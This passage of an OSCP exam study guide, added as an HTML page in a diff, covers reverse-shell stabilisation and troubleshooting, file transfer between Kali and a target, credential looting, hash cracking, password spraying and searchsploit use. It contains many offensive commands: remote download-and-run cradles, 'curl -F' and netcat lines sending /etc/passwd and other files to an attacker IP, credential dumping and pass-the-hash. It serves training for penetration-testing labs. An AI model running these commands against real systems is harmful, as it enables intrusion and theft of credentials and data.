+stty rows 50 columns 200                          # step 4: match your window size (run &#x27;stty -a&#x27; locally to see yours)</code></pre>
+<p>Alternatives: <code>script -qc /bin/bash /dev/null</code>; or full <code>socat</code> TTY if socat is on both ends.</p>
+<p><strong>Windows &quot;stabilizing&quot;:</strong> upgrade to evil-winrm / RDP / RunasCs / ConPtyShell. Native cmd/powershell reverse shells are only *semi*-interactive — avoid programs that prompt for input; run non-interactive commands.</p>
+<ul>
+<li><strong>Invoke-ConPtyShell</strong> (the best Windows interactive shell): on Kali <code>stty raw -echo; nc -lvnp 443</code>; on target <code>IEX(IWR http://&lt;IP&gt;/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell &lt;IP&gt; 443 &lt;rows&gt; &lt;cols&gt;</code>.</li>
+<li><strong>Kali ships ready-made webshells:</strong> <code>ls /usr/share/webshells/</code> (php, asp, aspx, jsp, perl) — copy one instead of writing your own.</li>
+</ul>
+<h2 id="v5-[reverse-shell-not-connecting]-its-not-connecting-work-through-this-in-order">[REVERSE-SHELL-NOT-CONNECTING]  it&#x27;s not connecting — work through this in order<a class="anchor" href="#v5-[reverse-shell-not-connecting]-its-not-connecting-work-through-this-in-order">#</a></h2>
+<pre><code>1. Is the listener actually running, on the right port?   → nc -lvnp 443 in a live terminal
+2. Right LHOST (your tun0 VPN IP, NOT eth0)?             → ip addr show tun0   ← #1 cause of failure
+3. Right LPORT, and does the target allow it out?         → try 443, then 80, then 8080
+4. Did the payload actually run on the target?            → did the web request/command return? read errors
+5. Did encoding/quoting mangle it?                        → URL-encode web payloads; base64 the command
+6. Wrong shell program?                                   → try sh instead of bash; or python; nc; perl
+7. Windows AV/AMSI ate the PowerShell payload?            → base64/obfuscate it, or use nc.exe / an msfvenom exe
+8. Is all outbound blocked?                               → use a BIND shell instead, or pivot, or a web shell
+9. Firewall on YOUR side?                                 → check your host firewall / VPN routing
+10. Still nothing?                                        → tcpdump -i tun0 port 443   (do you even see the SYN?)</code></pre>
+<p>Most common, in order: <strong>wrong LHOST (used eth0 instead of tun0)</strong>, listener not running, blocked port, quoting/encoding, AV.</p>
+<hr>
+<h1 id="v5-[filetransfer-quick]-moving-files-between-kali-and-the-target">[FILETRANSFER-QUICK]  MOVING FILES BETWEEN KALI AND THE TARGET<a class="anchor" href="#v5-[filetransfer-quick]-moving-files-between-kali-and-the-target">#</a></h1>
+<blockquote>The model is almost always: <strong>Kali serves a file, the target downloads it.</strong> So you start a mini web server on Kali, then run a download command on the target.</blockquote>
+<h2 id="v5-[quick]-serve-from-kali">[QUICK]  serve from Kali<a class="anchor" href="#v5-[quick]-serve-from-kali">#</a></h2>
+<pre><code>python3 -m http.server 80                          # [MUST-MEMORIZE] serves the CURRENT folder over http on port 80
+impacket-smbserver share $(pwd) -smb2support       # serve current folder as a Windows SMB share (great for Windows)
+#   add  -user u -password p  if the target refuses anonymous SMB</code></pre>
+<h3 id="v5-kali-linux-target-download-onto-the-target">Kali → Linux target (download onto the target)<a class="anchor" href="#v5-kali-linux-target-download-onto-the-target">#</a></h3>
+<pre><code>wget http://&lt;IP&gt;/file -O /tmp/file          # [MUST-MEMORIZE]  &lt;IP&gt; = your Kali IP
+curl http://&lt;IP&gt;/file -o /tmp/file
+# no wget or curl on the box? use bash&#x27;s built-in TCP:
+exec 3&lt;&gt;/dev/tcp/&lt;IP&gt;/80; echo -e &quot;GET /file HTTP/1.0\r\n\r\n&quot; &gt;&amp;3; cat &lt;&amp;3</code></pre>
+<h3 id="v5-kali-windows-target-download-onto-the-target">Kali → Windows target (download onto the target)<a class="anchor" href="#v5-kali-windows-target-download-onto-the-target">#</a></h3>
+<pre><code>certutil -urlcache -split -f http://&lt;IP&gt;/file.exe file.exe          # [MUST-RECOGNIZE] classic Windows downloader
+powershell -c &quot;Invoke-WebRequest http://&lt;IP&gt;/file -OutFile file&quot;    # modern PowerShell download
+powershell -c &quot;(New-Object Net.WebClient).DownloadFile(&#x27;http://&lt;IP&gt;/f&#x27;,&#x27;C:\Windows\Temp\f&#x27;)&quot;   # works on OLD PowerShell too
+copy \\&lt;IP&gt;\share\file.exe .            # pull from your impacket-smbserver share
+curl.exe http://&lt;IP&gt;/file -o file       # certutil blocked? curl.exe exists on Win10+ (note the .exe)</code></pre>
+<h3 id="v5-target-kali-send-loot-back-to-you">Target → Kali (send loot back to you)<a class="anchor" href="#v5-target-kali-send-loot-back-to-you">#</a></h3>
+<pre><code># On Kali, receive with netcat:
+nc -lvnp 443 &gt; loot.dat                 # then on the target:  nc &lt;IP&gt; 443 &lt; file
+# Linux target push over HTTP (needs a server that accepts uploads):
+curl -F &#x27;f=@/etc/passwd&#x27; http://&lt;IP&gt;:8000/
+# Windows target → your SMB share:
+copy C:\loot\file.txt \\&lt;IP&gt;\share\
+# over SSH:
+scp file user@&lt;IP&gt;:/path          # or from Kali:  scp user@target:/path/file .</code></pre>
+<h3 id="v5-base64-when-theres-no-working-network-transfer">base64 (when there&#x27;s no working network transfer)<a class="anchor" href="#v5-base64-when-theres-no-working-network-transfer">#</a></h3>
+<pre><code># on the SOURCE machine, print the file as text:
+base64 -w0 file                                     # Linux
+# (PowerShell:  [Convert]::ToBase64String([IO.File]::ReadAllBytes(&quot;f&quot;))  )
+# copy that text, then on the DESTINATION rebuild it:
+echo &lt;base64text&gt; | base64 -d &gt; file                # Linux
+# (PowerShell:  [IO.File]::WriteAllBytes(&quot;f&quot;,[Convert]::FromBase64String(&quot;&lt;b64&gt;&quot;))  )</code></pre>
+<h2 id="v5-[filetransfer-troubleshooting]">[FILETRANSFER-TROUBLESHOOTING]<a class="anchor" href="#v5-[filetransfer-troubleshooting]">#</a></h2>
+<div class="tablewrap"><table><thead><tr><th>Problem</th><th>Fix</th></tr></thead><tbody>
+<tr><td>certutil blocked / flagged by AV</td><td>use <code>curl.exe</code>, <code>bitsadmin</code>, PowerShell DownloadFile, or SMB</td></tr>
+<tr><td>PowerShell download fails (proxy/TLS)</td><td><code>[Net.ServicePointManager]::SecurityProtocol=&#x27;Tls12&#x27;</code>; use the IP, not a hostname</td></tr>
+<tr><td>Binary is corrupted (Linux ftp)</td><td>set <code>binary</code> mode before <code>get</code></td></tr>
+<tr><td>SMB copy denied</td><td>use <code>-smb2support</code>, or add <code>-user/-password</code> and <code>net use</code> on the target</td></tr>
+<tr><td>No outbound at all</td><td>serve FROM the target and pull to Kali, or base64-paste</td></tr>
+<tr><td>Exe won&#x27;t run (&quot;not a valid application&quot;)</td><td>wrong architecture — match x86 vs x64</td></tr>
+</tbody></table></div>
+<hr>
+<h1 id="v5-[password-attacks]-everything-about-passwords-in-one-place">[PASSWORD-ATTACKS]  🔑 everything about passwords, in one place<a class="anchor" href="#v5-[password-attacks]-everything-about-passwords-in-one-place">#</a></h1>
+<pre><code>FIND creds     → [CREDENTIALS-QUICK] [CREDENTIALS-SOURCES] [FOUND-CREDS] [FOUND-SSHKEY]
+GUESS online   → [PASSWORD-SPRAY] (spray, lockout-aware) · [HYDRA] · netexec/kerbrute spraying
+IDENTIFY hash  → [HASH-IDENTIFICATION] (what kind of hash is this?)
+CRACK offline  → hashcat / john · [WORDLIST-MUTATE] · *2john converters (ssh/zip/keepass/office)
+DUMP creds     → mimikatz/secretsdump/lsassy/LaZagne/SAM (Windows)
+USE without cracking → Pass-the-Hash (nxc -H / evil-winrm -H / psexec -hashes) · Pass-the-Ticket
+AD-specific    → [AD-KERBEROAST] [AD-ASREP] gpp-decrypt · DCSync</code></pre>
+<blockquote><strong>The winning order:</strong> found a password → <strong>spray it everywhere first</strong>. Got a *hash*? → <strong>try Pass-the-Hash before cracking</strong> (often you don&#x27;t need the plaintext). Must crack? → rockyou + rules. Still stuck? → build a custom list from the site (<code class="tag">[WORDLIST-MUTATE]</code>). Still nothing? → <strong>move on</strong> — don&#x27;t grind a strong hash for hours (<code class="tag">[COMMON-RABBIT-HOLES]</code>).</blockquote>
+<h1 id="v5-[credentials-quick]-using-credentials">[CREDENTIALS-QUICK]  USING CREDENTIALS<a class="anchor" href="#v5-[credentials-quick]-using-credentials">#</a></h1>
+<h2 id="v5-[quick]-the-golden-rule-every-credential-try-it-everywhere">[QUICK]  the golden rule: every credential → try it EVERYWHERE<a class="anchor" href="#v5-[quick]-the-golden-rule-every-credential-try-it-everywhere">#</a></h2>
+<pre><code>nxc smb   $IP -u u -p p         # test on SMB (add --local-auth for local, non-domain accounts)
+nxc winrm $IP -u u -p p         # test on WinRM (Pwn3d! = you can get a shell here)
+nxc ldap  &lt;dc&gt; -u u -p p        # validate against the domain / dump LDAP
+nxc mssql $IP -u u -p p         # test on MSSQL (→ xp_cmdshell if it works)
+nxc rdp   $IP -u u -p p         # test on RDP (Pwn3d! = you can log in to the desktop)
+ssh u@$IP ; evil-winrm -i $IP -u u -p p          # actually log in wherever the cred worked</code></pre>
+<p>Also try the same password as <strong>other usernames</strong>, with small <strong>variations</strong>, and as a <strong>domain</strong> account (<code>-d DOMAIN</code>) vs a <strong>local</strong> account (<code>--local-auth</code>).</p>
+<h2 id="v5-[credentials-sources]-where-to-loot-creds-after-you-get-a-shell">[CREDENTIALS-SOURCES]  where to loot creds after you get a shell<a class="anchor" href="#v5-[credentials-sources]-where-to-loot-creds-after-you-get-a-shell">#</a></h2>
+<p><strong>Linux:</strong> <code>/etc/passwd</code> + <code>/etc/shadow</code> (need root), <code>~/.ssh/id_*</code> keys, <code>~/.bash_history</code>, <code>/var/www/**/config*</code>, <code>.env</code> files, DB configs, cron scripts, backups, <code>find / -name &quot;*.kdbx&quot;</code> (KeePass), mounted shares.</p>
+<p><strong>Windows:</strong> <code>secretsdump.py &#x27;DOMAIN/u:p&#x27;@host</code> (dumps SAM/LSA/NTDS), the SAM+SYSTEM registry hives, an LSASS memory dump (mimikatz/comsvcs), <code>cmdkey /list</code> + <code>runas /savecred</code>, DPAPI, PowerShell history (<code>ConsoleHost_history.txt</code>), <code>unattend.xml</code>, GPP <code>cpassword</code>, KeePass, browser creds, autologon registry (<code>DefaultPassword</code>).</p>
+<h2 id="v5-[hash-identification]-i-found-a-hash-what-is-it">[HASH-IDENTIFICATION]  &quot;I found a hash — what is it?&quot;<a class="anchor" href="#v5-[hash-identification]-i-found-a-hash-what-is-it">#</a></h2>
+<blockquote><strong>What&#x27;s a hash?</strong> A password stored as a scrambled fingerprint. You can&#x27;t un-scramble it, but you can guess passwords, hash each guess, and compare — that&#x27;s &quot;cracking.&quot;</blockquote>
+<ul>
+<li>Identify it: <code>hashid &lt;hash&gt;</code>, <code>hash-identifier</code>, or <code>nth --text &lt;hash&gt;</code> (name-that-hash). Or recognise it by shape:</li>
+<ul>
+<li><strong>32 hex characters</strong> → MD5 or NTLM (NTLM if it came from a Windows dump).</li>
+<li>**Linux <code>/etc/shadow</code>** uses the format <code>$id$salt$hash</code> — the <code>$id$</code> says which algorithm: <code>$1$</code>=md5crypt, <code>$5$</code>=sha256crypt (<code>-m 7400</code>), **<code>$6$</code>=sha512crypt (<code>-m 1800</code>)**, <code>$y$</code>=yescrypt. Example: <code>root:$6$SALT$HASH:…</code> = root&#x27;s password as SHA-512crypt.</li>
+<li><code>$2a$</code> / <code>$2b$</code> → bcrypt.</li>
+<li><code>aad3b435...:&lt;32hex&gt;</code> → an LM:NTLM pair (use the NTLM half, after the colon).</li>
+<li><code>user::DOMAIN:...</code> (long) → <strong>NetNTLMv2</strong> (what Responder captures).</li>
+<li><code>$krb5tgs$23$...</code> → Kerberoast hash. <code>$krb5asrep$23$...</code> → AS-REP hash.</li>
+</ul>
+<li><strong>hashcat mode numbers to memorise</strong> (<code>-m</code> must match the hash type):</li>
+</ul>
+<p>  <code></code>`</p>
+<p>  NTLM 1000 | NetNTLMv2 5600 | Kerberoast 13100 | AS-REP 18200</p>
+<p>  md5crypt 500 | sha512crypt 1800 | bcrypt 3200 | domain-cached 2100</p>
+<p>  raw-md5 0 | raw-sha1 100 | NetNTLMv1 5500 | JWT(HS256) 16500 | KeePass 13400</p>
+<p>  <code></code>`</p>
+<ul>
+<li><strong>Crack it:</strong></li>
+</ul>
+<p>  <code></code>`bash</p>
+<p>  hashcat -m 1000 hashes.txt rockyou.txt -O                  # crack NTLM with the rockyou wordlist; -O = optimized/faster</p>
+<p>  hashcat -m 13100 tgs.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule   # Kerberoast + password mutations</p>
+<p>  john --format=&lt;fmt&gt; --wordlist=rockyou.txt hashes.txt      # john is an alternative; it can auto-detect the type</p>
+<p>  <code></code>`</p>
+<p>  <strong>Command anatomy:</strong> <code>hashcat -m &lt;TYPE&gt; &lt;your-hash-file&gt; &lt;Kali-wordlist&gt; [-r rules] [-O]</code>. <code>-m</code> picks the hash type; <code>-a 3 ?u?l?l?d?d</code> switches to brute-forcing a *pattern* instead of a wordlist.</p>
+<ul>
+<li><strong>Wordlists/rules live at:</strong> <code>/usr/share/wordlists/rockyou.txt</code> (gunzip it once), SecLists; rules <code>best64</code>, <code>rockyou-30000</code>, <code>OneRuleToRuleThemAll</code> <code class="tag">[LOOK-UP]</code>.</li>
+</ul>
+<h2 id="v5-[wordlist-mutate]-building-a-custom-wordlist-when-rockyou-fails">[WORDLIST-MUTATE]  building a custom wordlist (when rockyou fails)<a class="anchor" href="#v5-[wordlist-mutate]-building-a-custom-wordlist-when-rockyou-fails">#</a></h2>
+<p><strong>Best practice — mutate on the fly with &quot;rules&quot; (no need to pre-build a file):</strong></p>
+<pre><code>hashcat -m &lt;mode&gt; hash.txt base.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m &lt;mode&gt; hash.txt base.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule   # bigger, slower</code></pre>
+<p><strong>Generate a mutated list to a FILE</strong> (to feed hydra/nxc, which can&#x27;t do rules themselves):</p>
+<pre><code>hashcat --stdout base.txt -r /usr/share/hashcat/rules/best64.rule &gt; mutated.txt
+john --wordlist=base.txt --rules=Jumbo --stdout &gt; mutated.txt</code></pre>
+<p><strong>Build a base list from the target itself</strong> (a very common OSCP move — the password is often a company word):</p>
+<pre><code>cewl -d 2 -m 5 http://$IP -w words.txt     # scrape the website into a wordlist (-d depth, -m min length)
+cupp -i                                     # interactive: build a list from a person&#x27;s name/dates/pets
+crunch 8 10 -t Summer@@@@ -o w.txt          # generate by pattern (@=letter, %=digit, ^=symbol)</code></pre>
+<p><strong>hashcat rule syntax</strong> (each LINE is one rule; the functions apply left→right to every word):</p>
+<pre><code>$X = append char X     ^X = prepend char X     c = Capitalize (u=UPPER, l=lower, t=toGGLE)
+sXY = substitute X→Y (leetspeak: sa@ ss$ so0)   d = duplicate word   r = reverse   [ ]=delete first/last
+# example: the rule  &quot;$1 c $!&quot;  turns  password → password1 → Password1 → Password1!
+printf &#x27;$1 c $!\n$2 c $!\n&#x27; &gt; demo.rule
+hashcat --stdout wordlist.txt -r demo.rule       # PREVIEW what candidates it makes (doesn&#x27;t crack — just shows)
+hashcat -m &lt;mode&gt; hash.txt wordlist.txt -r demo.rule</code></pre>
+<p><strong>When to bother:</strong> rockyou failed but you have a hint (company name, a word you found, a <code>Season+Year!</code> pattern). Don&#x27;t grind giant rule-sets against a strong Kerberos/bcrypt hash — move on.</p>
+<ul>
+<li><strong>Don&#x27;t crack if you can pass:</strong> got an NTLM hash? Try <strong>Pass-the-Hash</strong> first (<code>nxc -H</code>, <code>evil-winrm -H</code>, <code>psexec -hashes</code>) — you may never need the plaintext.</li>
+</ul>
+<h2 id="v5-[credentials-tools]">[CREDENTIALS-TOOLS]<a class="anchor" href="#v5-[credentials-tools]">#</a></h2>
+<ul>
+<li><code>secretsdump.py</code> (impacket) — dump SAM/LSA/NTDS, and DCSync.</li>
+<li><code>mimikatz</code> — pull creds/tickets from Windows memory.</li>
+<li><code>hashcat</code> / <code>john</code> — offline cracking.</li>
+<li><code>ssh2john</code>, <code>keepass2john</code>, <code>zip2john</code>, <code>office2john</code> — turn a protected file into a crackable hash.</li>
+<li><code>nxc</code> / <code>crackmapexec</code> — spraying and Pass-the-Hash.</li>
+</ul>
+<hr>
+<h1 id="v5-[exploit-research]-finding-and-using-public-exploits">[EXPLOIT-RESEARCH]  finding and using public exploits<a class="anchor" href="#v5-[exploit-research]-finding-and-using-public-exploits">#</a></h1>
+<h2 id="v5-[quick]-the-pipeline">[QUICK]  the pipeline<a class="anchor" href="#v5-[quick]-the-pipeline">#</a></h2>
+<pre><code>KNOWN VULNERABLE VERSION → searchsploit / web CVE search → pick a match → READ the code
+→ verify it matches (version + arch + auth + language) → edit it (your LHOST/LPORT/paths) → test → run</code></pre>
+<h2 id="v5-[searchsploit]-the-offline-exploit-db-search-tool">[SEARCHSPLOIT]  the offline Exploit-DB search tool<a class="anchor" href="#v5-[searchsploit]-the-offline-exploit-db-search-tool">#</a></h2>
+<pre><code>searchsploit remote smb microsoft windows       # keywords are AND-ed together (searches title + path)
+searchsploit apache 2.4.49                       # product + version
+searchsploit -t apache                           # -t = search TITLES only (far fewer false hits)
+searchsploit --exclude=&quot;dos&quot; wordpress 5.7       # drop the denial-of-service noise
+searchsploit --cve 2021-41773                    # search by CVE id
+searchsploit --nmap scans/scan.xml               # search straight from your nmap XML (scan with -oX)
+# once you find one:
+searchsploit -x 50383                            # -x = read/examine exploit #50383
+searchsploit -m 50383                            # -m = copy (&quot;mirror&quot;) it into your current folder
+searchsploit -p 50383                            # -p = print its full file path
+searchsploit -u                                  # update the local exploit database</code></pre>
+<p><strong>Reading the results:</strong> the folder in the <strong>path</strong> tells you the type — <code>/remote/</code> = remote exploit, <code>/webapps/</code> = web app, <code>/local/</code> = local privilege escalation, <code>/dos/</code> = <strong>denial-of-service (crashes things — usually useless for getting in, skip it)</strong>. <strong>Tip:</strong> searchsploit matches literal text, so an over-specific version can miss — search broader (<code>apache 2.4</code>) and eyeball it, or use <code>-t</code>. Always <strong>read the exploit</strong> with <code>-x</code> before running it.</p>
+<ul>
+<li>On the web, search <code>&quot;&lt;product&gt; &lt;version&gt; exploit&quot;</code>, <code>&quot;&lt;product&gt; CVE&quot;</code>, GitHub, Exploit-DB, PacketStorm. Prefer proof-of-concepts you can <strong>read</strong>.</li>
+<li><strong>Match precisely:</strong> exact version (off-by-one breaks it), architecture (x86/x64), whether it needs a login (authed vs unauth), and interpreter version (Python2 vs 3).</li>
+<li><strong>Before running, read it:</strong> what does it do? Does it need a listener or arguments? Could it crash the service? Change any hard-coded IPs/ports/paths to yours.</li>
+<li><strong>Common breakage:</strong> Python2 syntax (<code>print &quot;x&quot;</code>), missing libraries, wrong <code>LHOST</code>, wrong target offset, a needed header/cookie, or a required valid session.</li>
+</ul>
+<h2 id="v5-[exploit-research-cautions]">[EXPLOIT-RESEARCH-CAUTIONS]<a class="anchor" href="#v5-[exploit-research-cautions]">#</a></h2>
+<ul>
+<li><strong>Never run an unknown PoC blindly</strong> — some are booby-trapped to attack *you*. Read every line; watch what it connects to.</li>
+<li>Memory-corruption/DoS exploits can crash the box (costing you a revert). Prefer stable, logic-based exploits.</li>
+<li>If an exploit &quot;should&quot; work but doesn&#x27;t: recheck the version match, try the manual technique the CVE describes, or find another PoC.</li>
+<li><strong>Exam rule:</strong> you may use public exploit code you understand and run by hand; you may NOT use Metasploit beyond your one allowed target. Screenshot everything for the report.</li>
+</ul>
+<hr>
+<p>*End Volume 3. Next: Volume 4 — going from a normal user to root/SYSTEM (privilege escalation).*</p></section></main>
+  </div>
+</div>
+<button id="totop" onclick="window.scrollTo({top:0,behavior:'smooth'})" title="Top">↑</button>
+<script>
+function toggleTheme(){var h=document.documentElement,t=h.getAttribute('data-theme')==='dark'?'light':'dark';h.setAttribute('data-theme',t);try{localStorage.setItem('oscpkb-theme',t)}catch(e){}}
+try{var s=localStorage.getItem('oscpkb-theme');if(s)document.documentElement.setAttribute('data-theme',s)}catch(e){}
+var content=document.getElementById('content'),searchBox=document.getElementById('search'),countEl=document.getElementById('count');
+var marks=[],cur=-1;
+function clearMarks(){marks.forEach(function(m){var p=m.parentNode;p.replaceChild(document.createTextNode(m.textContent),m);p.normalize();});marks=[];cur=-1;countEl.textContent='';}
+function clearSearch(){searchBox.value='';clearMarks();searchBox.focus();}
+function doSearch(){clearMarks();var q=searchBox.value.trim();if(q.length<2)return;var rx=new RegExp(q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'),'gi');var wk=document.createTreeWalker(content,NodeFilter.SHOW_TEXT,{acceptNode:function(n){if(!n.nodeValue.trim())return NodeFilter.FILTER_REJECT;var t=n.parentNode.tagName;if(t==='SCRIPT'||t==='STYLE')return NodeFilter.FILTER_REJECT;return rx.test(n.nodeValue)?NodeFilter.FILTER_ACCEPT:NodeFilter.FILTER_REJECT;}});var tg=[],node;while(node=wk.nextNode())tg.push(node);tg.forEach(function(n){rx.lastIndex=0;var frag=document.createDocumentFragment(),last=0,s=n.nodeValue,m;while(m=rx.exec(s)){if(m.index>last)frag.appendChild(document.createTextNode(s.slice(last,m.index)));var mk=document.createElement('mark');mk.textContent=m[0];frag.appendChild(mk);marks.push(mk);last=m.index+m[0].length;if(m.index===rx.lastIndex)rx.lastIndex++;}if(last<s.length)frag.appendChild(document.createTextNode(s.slice(last)));n.parentNode.replaceChild(frag,n);});countEl.textContent=marks.length?('0/'+marks.length):'0 hits';if(marks.length){cur=-1;jump(1);}}
+function jump(d){if(!marks.length)return;if(cur>=0)marks[cur].classList.remove('current');cur=(cur+d+marks.length)%marks.length;var m=marks[cur];m.classList.add('current');m.scrollIntoView({behavior:'smooth',block:'center'});countEl.textContent=(cur+1)+'/'+marks.length;}
+var deb;searchBox.addEventListener('input',function(){clearTimeout(deb);deb=setTimeout(doSearch,180);});
+searchBox.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();jump(e.shiftKey?-1:1);}if(e.key==='Escape'){clearSearch();}});
+document.addEventListener('keydown',function(e){if(e.key==='/'&&document.activeElement!==searchBox&&(document.activeElement.id!=='navfilter')){e.preventDefault();searchBox.focus();}});
+content.addEventListener('click',function(e){if(e.target.classList.contains('tag')){searchBox.value=e.target.textContent;doSearch();}});
+var nf=document.getElementById('navfilter');nf.addEventListener('input',function(){var q=this.value.toLowerCase();document.querySelectorAll('#nav .navlink').forEach(function(a){a.style.display=(!q||a.textContent.toLowerCase().indexOf(q)>=0)?'':'none';});});
+var totop=document.getElementById('totop');window.addEventListener('scroll',function(){totop.style.display=window.scrollY>500?'block':'none';});
+document.getElementById('nav').addEventListener('click',function(e){if(e.target.classList.contains('navlink')&&window.innerWidth<=900)document.getElementById('sidebar').classList.remove('open');});
+</script>
+</body>
+</html>
